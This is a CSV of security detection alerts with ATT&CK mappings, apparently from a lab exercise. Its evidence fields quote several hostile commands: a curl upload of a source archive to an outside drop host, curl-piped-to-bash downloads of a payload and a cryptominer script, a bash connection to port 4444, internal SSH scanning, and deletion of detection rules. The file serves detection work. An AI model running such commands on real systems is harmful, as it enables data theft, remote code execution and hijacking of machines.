@@ -1,0 +1,77 @@
+﻿detection_id,method,detection_type,name,attck,severity,event_time_utc,log_source,source_row,bucket,host,client_ip,account,person_candidate,work_session_id,linked_sessions,link_basis,evidence
+D0001,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-01 07:14:35.615000,teiren_audit,19,session,,10.20.10.71,admin01@lab.internal,admin01,S007,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0002,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-01 08:23:33.544000,teiren_audit,28,session,,10.20.10.71,admin01@lab.internal,admin01,S010,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0003,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-02 03:45:30.147000,teiren_audit,40,session,,10.20.10.71,admin01@lab.internal,admin01,S014,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0004,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-02 07:29:31.604000,teiren_audit,58,session,,10.20.10.71,admin01@lab.internal,admin01,S020,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0005,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-03 06:27:09.243000,teiren_audit,67,session,,10.20.10.71,admin01@lab.internal,admin01,S023,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0006,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-04 07:24:34.671000,teiren_audit,73,session,,10.20.10.71,admin01@lab.internal,admin01,S025,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0007,behavior,B01,평소와 다른 시작 시각,,,2026-10-05 00:07:24.593083,,,session,,10.20.10.71,admin01,admin01,S026,,세션 소속,"[person n=6] 시작 9시, 평소 12~17시"
+D0008,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-05 00:07:26.593000,teiren_audit,76,session,,10.20.10.71,admin01@lab.internal,admin01,S026,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0009,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-05 04:48:03.240000,teiren_audit,94,session,,10.20.10.71,admin01@lab.internal,admin01,S032,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0010,behavior,B08,평소보다 많은 양,,,2026-10-05 09:02:34.163306,,,session,,10.20.10.81,web01,web01,S036,,세션 소속,[peer n=5] 과거 최대 초과: process_count=4
+D0011,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-06 01:46:26.308000,teiren_audit,115,session,,10.20.10.71,admin01@lab.internal,admin01,S039,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0012,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-06 03:11:14.061000,teiren_audit,124,session,,10.20.10.71,admin01@lab.internal,admin01,S042,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0013,behavior,B01,평소와 다른 시작 시각,,,2026-10-06 08:02:18.211383,,,session,,10.20.10.12,dev02,dev02,S050,,세션 소속,"[peer n=14] 시작 17시, 평소 9~15시"
+D0014,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-07 00:06:24.496000,teiren_audit,154,session,,10.20.10.71,admin01@lab.internal,admin01,S052,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0015,behavior,B01,평소와 다른 시작 시각,,,2026-10-07 01:09:25.420085,,,session,,10.20.10.51,analyst01,analyst01,S053,,세션 소속,"[peer n=10] 시작 10시, 평소 12~19시"
+D0016,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-07 02:47:44.890000,teiren_audit,163,session,,10.20.10.71,admin01@lab.internal,admin01,S055,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0017,behavior,B01,평소와 다른 시작 시각,,,2026-10-08 01:45:38.621549,,,session,,10.20.10.22,ops02,ops02,S063,,세션 소속,"[person n=6] 시작 10시, 평소 12~16시"
+D0018,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-08 04:02:35.820000,teiren_audit,202,session,,10.20.10.71,admin01@lab.internal,admin01,S068,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0019,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-09 01:11:35.763000,teiren_audit,223,session,,10.20.10.71,admin01@lab.internal,admin01,S075,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0020,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-10 00:38:30.176000,teiren_audit,256,session,,10.20.10.71,admin01@lab.internal,admin01,S086,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0021,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-11 05:46:13.421000,teiren_audit,265,session,,10.20.10.71,admin01@lab.internal,admin01,S089,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0022,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-12 06:47:23.033000,teiren_audit,289,session,,10.20.10.71,admin01@lab.internal,admin01,S097,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0023,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-12 07:01:41.209000,teiren_audit,292,session,,10.20.10.71,admin01@lab.internal,admin01,S098,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0024,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-13 00:08:14.438000,teiren_audit,301,session,,10.20.10.71,admin01@lab.internal,admin01,S101,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0025,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-14 08:16:48.140000,teiren_audit,355,session,,10.20.10.71,admin01@lab.internal,admin01,S119,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0026,behavior,B01,평소와 다른 시작 시각,,,2026-10-14 18:12:18.120000,,,session,,203.0.113.44,dev02,dev02,S122,,세션 소속,"[person n=13] 시작 3시, 평소 10~18시"
+D0027,behavior,B02,처음 보는 접속 IP,T1078,,2026-10-14 18:12:18.120000,,,session,,203.0.113.44,dev02,dev02,S122,,세션 소속,[person n=13] 처음 보는 IP 203.0.113.44 (external)
+D0028,behavior,B03,평소와 다른 접속 경로,,,2026-10-14 18:12:18.120000,,,session,,203.0.113.44,dev02,dev02,S122,,세션 소속,[person n=13] server_only: 과거 13개 세션 중 0개
+D0029,behavior,B06,누구도 쓴 적 없는 명령,,,2026-10-14 18:12:18.120000,,,session,,203.0.113.44,dev02,dev02,S122,,세션 소속,[person n=13] curl -X PUT https://files.transfer-example.net/drop/src-bundle.tgz --data-binary @/var/tmp/src-bundle.tgz|tar -czf /var/tmp/src-bundle.tgz /opt/app/src
+D0030,behavior,B07,로그인 전 실패 첫 발생,T1110,,2026-10-14 18:12:18.120000,,,session,,203.0.113.44,dev02,dev02,S122,,세션 소속,"[person n=13] 로그인 전 실패 3회, 과거 실패 세션 0"
+D0031,rule,R10,실패 뒤 로그인 성공,T1110|T1078,medium,2026-10-14 18:12:18.120000,sshd,1115,session,bastion-01,203.0.113.44,dev02,dev02,S122,,세션 소속,dev02@203.0.113.44 실패 3회 뒤 성공
+D0032,rule,R11,외부 IP에서 로그인 성공,T1078|T1133,medium,2026-10-14 18:12:18.120000,sshd,1115,session,bastion-01,203.0.113.44,dev02,dev02,S122,,세션 소속,ssh dev02 ← 203.0.113.44
+D0033,rule,R07,압축 파일 생성,T1560.001,medium,2026-10-14 18:12:58.120000,sysmon,4422,session,app-01,,dev02,dev02,S122,,세션 소속,tar -czf /var/tmp/src-bundle.tgz /opt/app/src
+D0034,rule,R08,외부로 파일 업로드,T1567|T1048,high,2026-10-14 18:13:28.120000,sysmon,4425,session,app-01,,dev02,dev02,S122,,세션 소속,curl -X PUT https://files.transfer-example.net/drop/src-bundle.tgz --data-binary @/var/tmp/src-bundle.tgz
+D0035,rule,R03,서버에서 외부로 연결,T1071,medium,2026-10-14 18:13:29.120000,sysmon,4426,session,app-01,,dev02,dev02,S122,,세션 소속,curl → 203.0.113.80:443
+D0036,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-15 01:15:25.003000,teiren_audit,370,session,,10.20.10.71,admin01@lab.internal,admin01,S125,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0037,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-15 02:15:05.569000,teiren_audit,380,session,,10.20.10.71,admin01@lab.internal,admin01,S129,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0038,behavior,B08,평소보다 많은 양,,,2026-10-15 03:39:09.088406,,,session,,10.20.10.21,ops01,ops01,S131,,세션 소속,[person n=27] 과거 최대 초과: process_count=7
+D0039,behavior,B02,처음 보는 접속 IP,T1078,,2026-10-15 05:07:03.880000,,,session,,198.51.100.77,,analyst01,S132,,세션 소속,[person n=10] 처음 보는 IP 198.51.100.77 (external)
+D0040,behavior,B03,평소와 다른 접속 경로,,,2026-10-15 05:07:03.880000,,,session,,198.51.100.77,,analyst01,S132,,세션 소속,[person n=10] web_only: 과거 10개 세션 중 0개
+D0041,behavior,B04,처음 보는 로그인 종류,T1078,,2026-10-15 05:07:03.880000,,,session,,198.51.100.77,,analyst01,S132,,세션 소속,[person n=10] IAM_LOGIN_NEW_DEVICE
+D0042,behavior,B05,처음 하는 민감 행위,,,2026-10-15 05:07:03.880000,,,session,,198.51.100.77,,analyst01,S132,,세션 소속,[person n=10] DEBUG_EXEC
+D0043,behavior,B08,평소보다 많은 양,,,2026-10-15 05:07:03.880000,,,session,,198.51.100.77,,analyst01,S132,,세션 소속,[person n=10] 과거 최대 초과: non_get_count=9
+D0044,rule,R11,외부 IP에서 로그인 성공,T1078|T1133,medium,2026-10-15 05:07:03.880000,teiren_audit,397,session,,198.51.100.77,analyst01@lab.internal,analyst01,S132,,세션 소속,콘솔 analyst01@lab.internal ← 198.51.100.77 (IAM_LOGIN_NEW_DEVICE)
+D0045,rule,R15,웹 경로 반복 오류,T1190|T1595,medium,2026-10-15 05:07:41.000000,nginx,1957,session,,198.51.100.77,,analyst01,S132,,세션 소속,198.51.100.77 /api/internal/debug/exec 5분 안 오류 5회
+D0046,rule,R14,내부 관리 기능 실행,T1059,high,2026-10-15 05:08:14.960000,teiren_audit,406,session,,198.51.100.77,analyst01@lab.internal,analyst01,S132,,세션 소속,DEBUG_EXEC /api/internal/debug/exec
+D0047,behavior,B09,처음 보는 시스템 활동 패턴,,,2026-10-15 05:08:16.880000,sysmon,4616,background,web-01,,www-data,,,"S132(웹 요청, 1초 차이)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,P025 처음 봄 (서버 기록 350.0시간): bash -c 'curl -s http://198.51.100.90/p.sh | bash'
+D0048,rule,R01,웹 서버 계정의 셸·다운로드 도구 실행,T1505.003|T1059.004,high,2026-10-15 05:08:16.880000,sysmon,4616,background,web-01,,www-data,,,"S132(웹 요청, 1초 차이)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,www-data 실행: bash -c 'curl -s http://198.51.100.90/p.sh | bash'
+D0049,rule,R02,다운로드 후 바로 실행,T1059.004|T1105,high,2026-10-15 05:08:16.880000,sysmon,4616,background,web-01,,www-data,,,"S132(웹 요청, 1초 차이)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,bash -c 'curl -s http://198.51.100.90/p.sh | bash'
+D0050,behavior,B09,처음 보는 시스템 활동 패턴,,,2026-10-15 05:08:17.880000,sysmon,4617,background,web-01,,www-data,,,"S132(웹 요청, 2초 차이)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,P026 처음 봄 (서버 기록 350.0시간): curl -s http://198.51.100.90/p.sh -o /tmp/p.sh
+D0051,rule,R01,웹 서버 계정의 셸·다운로드 도구 실행,T1505.003|T1059.004,high,2026-10-15 05:08:17.880000,sysmon,4617,background,web-01,,www-data,,,"S132(웹 요청, 2초 차이)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,www-data 실행: curl -s http://198.51.100.90/p.sh -o /tmp/p.sh
+D0052,behavior,B09,처음 보는 시스템 활동 패턴,,,2026-10-15 05:08:18.880000,sysmon,4618,background,web-01,,www-data,,,"S132(웹 요청, 3초 차이)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,P027 처음 봄 (서버 기록 350.0시간): /tmp/p.sh
+D0053,behavior,B09,처음 보는 시스템 활동 패턴,,,2026-10-15 05:08:18.880000,sysmon,4619,background,web-01,,www-data,,,"S132(웹 요청, 3초 차이)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,P028 처음 봄 (서버 기록 350.0시간): external:80
+D0054,rule,R03,서버에서 외부로 연결,T1071,medium,2026-10-15 05:08:18.880000,sysmon,4619,background,web-01,,www-data,,,"S132(웹 요청, 3초 차이)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,curl → 198.51.100.90:80
+D0055,behavior,B01,평소와 다른 시작 시각,,,2026-10-15 17:41:09.440000,,,session,,10.20.10.22,ops02,ops02,S137,,세션 소속,"[person n=15] 시작 2시, 평소 8~16시"
+D0056,behavior,B03,평소와 다른 접속 경로,,,2026-10-15 17:41:09.440000,,,session,,10.20.10.22,ops02,ops02,S137,,세션 소속,[person n=15] server_only: 과거 15개 세션 중 0개
+D0057,behavior,B09,처음 보는 시스템 활동 패턴,,,2026-10-15 17:41:29.440000,sysmon,4780,background,node-01,,root,,,"S137(서버, 20초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,P029 처음 봄 (서버 기록 361.6시간): bash -c 'curl -s http://203.0.113.90/setup_xmr.sh | bash'
+D0058,rule,R02,다운로드 후 바로 실행,T1059.004|T1105,high,2026-10-15 17:41:29.440000,sysmon,4780,background,node-01,,root,,,"S137(서버, 20초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,bash -c 'curl -s http://203.0.113.90/setup_xmr.sh | bash'
+D0059,behavior,B09,처음 보는 시스템 활동 패턴,,,2026-10-15 17:41:31.440000,sysmon,4781,background,node-01,,root,,,"S137(서버, 22초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,P030 처음 봄 (서버 기록 361.6시간): curl -s http://203.0.113.90/setup_xmr.sh -o /var/tmp/.x2mr
+D0060,behavior,B09,처음 보는 시스템 활동 패턴,,,2026-10-15 17:41:32.440000,sysmon,4782,background,node-01,,root,,,"S137(서버, 23초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,P031 처음 봄 (서버 기록 361.6시간): /var/tmp/.x2mr
+D0061,behavior,B09,처음 보는 시스템 활동 패턴,,,2026-10-15 17:41:32.440000,sysmon,4783,background,node-01,,root,,,"S137(서버, 23초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,P032 처음 봄 (서버 기록 361.6시간): external:80
+D0062,rule,R03,서버에서 외부로 연결,T1071,medium,2026-10-15 17:41:32.440000,sysmon,4783,background,node-01,,root,,,"S137(서버, 23초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,curl → 203.0.113.90:80
+D0063,rule,R06,임시 폴더의 숨김 파일 생성,T1564.001,medium,2026-10-15 17:41:32.440000,sysmon,4782,background,node-01,,root,,,"S137(서버, 23초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,/var/tmp/.x2mr
+D0064,behavior,B09,처음 보는 시스템 활동 패턴,,,2026-10-15 17:42:29.440000,sysmon,4785,background,node-01,,root,,,"S137(서버, 80초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,P033 처음 봄 (서버 기록 361.6시간): server:22
+D0065,rule,R05,내부 SSH 스캔,T1021.004|T1046,high,2026-10-15 17:42:43.440000,sysmon,4787,background,node-01,,root,,,"S137(서버, 94초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,"node-01에서 5분 안 22번 연결 3대: 10.10.1.10, 10.10.1.20, 10.10.1.30"
+D0066,behavior,B09,처음 보는 시스템 활동 패턴,,,2026-10-15 17:42:50.440000,sysmon,4788,background,node-01,,root,,,"S137(서버, 101초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,P034 처음 봄 (서버 기록 361.6시간): external:4444
+D0067,rule,R03,서버에서 외부로 연결,T1071,medium,2026-10-15 17:42:50.440000,sysmon,4788,background,node-01,,root,,,"S137(서버, 101초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,bash → 198.51.100.10:4444
+D0068,rule,R04,비표준 포트로 외부 연결,T1571,high,2026-10-15 17:42:50.440000,sysmon,4788,background,node-01,,root,,,"S137(서버, 101초 경과)",추정: 같은 서버·시간 / 웹 서버의 웹 요청 앞뒤 5분,bash → 198.51.100.10:4444
+D0069,rule,R16,MFA 없는 최상위 계정 로그인,T1078.004,low,2026-10-16 00:41:04.633000,teiren_audit,419,session,,10.20.10.71,admin01@lab.internal,admin01,S138,,세션 소속,admin01@lab.internal ← 10.20.10.71
+D0070,behavior,B08,평소보다 많은 양,,,2026-10-16 01:50:11.576680,,,session,,10.20.10.21,ops01,ops01,S139,,세션 소속,[person n=28] 과거 최대 초과: process_count=10
+D0071,behavior,B05,처음 하는 민감 행위,,,2026-10-16 06:14:29.654227,,,session,,10.20.10.61,intern01,intern01,S142,,세션 소속,[person n=11] IAM_POLICY_DETACH|IAM_USER_DELETE|RULE_DELETE
+D0072,behavior,B08,평소보다 많은 양,,,2026-10-16 06:14:29.654227,,,session,,10.20.10.61,intern01,intern01,S142,,세션 소속,[person n=11] 과거 최대 초과: non_get_count=4
+D0073,rule,R12,탐지 룰 삭제·비활성화,T1562.001,high,2026-10-16 06:19:43.430000,teiren_audit,441,session,,10.20.10.61,intern01@lab.internal,intern01,S142,,세션 소속,RULE_DELETE /api/threat/rule/exfil-watch
+D0074,rule,R12,탐지 룰 삭제·비활성화,T1562.001,high,2026-10-16 06:20:15.430000,teiren_audit,442,session,,10.20.10.61,intern01@lab.internal,intern01,S142,,세션 소속,RULE_DELETE /api/threat/rule/night-ssh
+D0075,rule,R13,계정·권한 조작,T1098|T1531,high,2026-10-16 06:20:47.430000,teiren_audit,443,session,,10.20.10.61,intern01@lab.internal,intern01,S142,,세션 소속,IAM_POLICY_DETACH /api/account/sub_account/intern01/policy
+D0076,rule,R13,계정·권한 조작,T1098|T1531,high,2026-10-16 06:21:06.430000,teiren_audit,444,session,,10.20.10.61,intern01@lab.internal,intern01,S142,,세션 소속,IAM_USER_DELETE /api/account/sub_account/web01/detail
